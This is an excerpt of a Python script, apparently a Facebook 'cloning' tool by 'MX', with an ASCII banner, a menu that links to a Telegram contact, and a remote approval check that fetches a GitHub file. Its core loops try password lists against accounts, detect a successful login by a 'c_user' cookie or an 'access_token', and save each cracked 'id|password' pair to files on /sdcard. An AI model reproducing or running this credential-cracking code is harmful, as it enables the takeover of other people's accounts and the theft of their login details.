...
{white} 88           88  88  88 
{green} 88           88  88  88 
{white} 88booo.      88  88  88 
{green} Y88888P      YP  YP  YP\n{white}───────────────────────────────────────────────\n <|●|> Devloper : MOHAMED 🪄💀/OUSSAMA \n <|●|> Tool Type: Old Cloning\n <|●|> Version:0.1\n              {green}>>>{white}MX Is Back{green}<<<\n{white}───────────────────────────────────────────────''')
#---------------------------| Menux |---------------------------#
def _____menux_____():
	clear()
...
def _____dev_____(): 
	...
	linex()
	print(f"{white}<|1|> Contact With MX") 
	...
	if dev in ['1','01']:
		os.system('xdg-open https://t.me/M_x_py');_____menux_____()
	elif dev in ['2','02']:
	...
	for pw in pwv:
		try: 
			...
			if "c_user" in ses.cookies.get_dict():
				...
				cp+=1
				print(f"\r\r{ping}<|LM-OK|> {idf} ● {pw} ")
				open('/sdcard/LM-RANDN-M1-OK.txt','a').write(idf+'|'+pw+'\n')
				break
			else:
				continue
	...
	for pw in pwv:
		try: 
			...
			if "c_user" in ses.cookies.get_dict():
				...
				cp+=1
				print(f"\r\r{ping}<|LM-OK|> {idf} ● {pw} ")
				open('/sdcard/LM-RANDN-M2-OK.txt','a').write(idf+'|'+pw+'\n')
				break
			else:
				continue
		except requests.exceptions.ConnectionError:
	...
	for pw in pwv:
		try: 
			...
			if "c_user" in ses.cookies.get_dict():
				...
				cp+=1
				print(f"\r\r{ping}<|LM-OK|> {idf} ● {pw} ")
				open('/sdcard/LM-RANDN-M3-OK.txt','a').write(idf+'|'+pw+'\n')
				break
			else:
				continue
		except requests.exceptions.ConnectionError:
	...
	try:
		for pw in pwv:
			...
			if 'access_token' in q:
				...
				print(f"\r\r{ping}<|LM-OK|> {idf} ● {pw} ")
				open('/sdcard/LM-RANDN-M6-OK.txt','a').write(idf+'|'+pw+'\n')
				break
			else:continue
		loop+=1
	except Exception as e:
...
def approval():
  ...
  try:
    httpCaht = get_response('https://github.com/HExXXD/HExXXD/blob/main/apv.txt')
